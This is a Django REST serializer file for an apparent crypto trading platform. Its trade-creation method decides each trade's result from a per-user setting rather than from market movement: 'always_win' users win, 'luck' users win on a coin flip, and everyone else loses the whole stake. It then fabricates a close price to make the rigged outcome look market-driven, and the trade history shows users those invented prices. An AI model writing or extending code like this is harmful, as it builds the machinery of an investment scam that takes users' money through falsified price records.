from rest_framework import serializers
from .models import Trade, Duration
import random

class DurationSerializer(serializers.ModelSerializer):
    class Meta:
        model = Duration
        fields = ["id", "duration", "win_percentage"]

class TradeSerializer(serializers.ModelSerializer):
    duration = DurationSerializer(read_only=True)  # Use nested serializer for GET
    duration_id = serializers.PrimaryKeyRelatedField(
        queryset=Duration.objects.all(),
        write_only=True,  # For POST
        source='duration'
    )

    class Meta:
        model = Trade
        fields = [
            "id",
            "coin", 
            "trade_method",
            "amount",
            "duration",  # For GET
            "duration_id",  # For POST
            "opened_at",
            "profit_or_loss",
            "is_closed",
            "open_price",  # New field
            "close_price",  # New field
        ]
        read_only_fields = ["opened_at", "profit_or_loss", "is_closed", "close_price"]

    def create(self, validated_data):
        """
        Handle trade creation and adjust close_price to align with predefined win_percentage.
        """
        trade = Trade.objects.create(**validated_data)
        open_price = validated_data.get("open_price")
        leverage = 6000  # Assume fixed leverage

        # Retrieve the win percentage from the related duration
        win_percentage = trade.duration.win_percentage / 100
        mode = trade.trade_method
        direction = 1 if mode == 'Buy Up' else -1

        user = trade.user
        if user.mode == 'always_win' or (user.mode == 'luck' and random.randint(0, 1)):
            # User wins: Calculate profit and adjust close_price upwards
            trade.profit_or_loss = trade.amount * win_percentage
            price_change = ((trade.profit_or_loss / trade.amount) * direction) / leverage
            trade.close_price = open_price * (1 + price_change)
        else:
            # User loses: Calculate loss and adjust close_price downwards
            trade.profit_or_loss = -trade.amount
            price_change = (abs(trade.profit_or_loss / trade.amount) * direction) / leverage
            trade.close_price = open_price * (1 - price_change)

        trade.save()
        return trade



class TradeHistorySerializer(serializers.ModelSerializer):
    duration = DurationSerializer(read_only=True)  # Include duration details

    class Meta:
        model = Trade
        fields = [
            "id",
            "trade_method",
            "amount",
            "duration",
            "opened_at",
            "open_price",
            "close_price",
            "profit_or_loss",
            "is_closed",
            "coin"
        ]
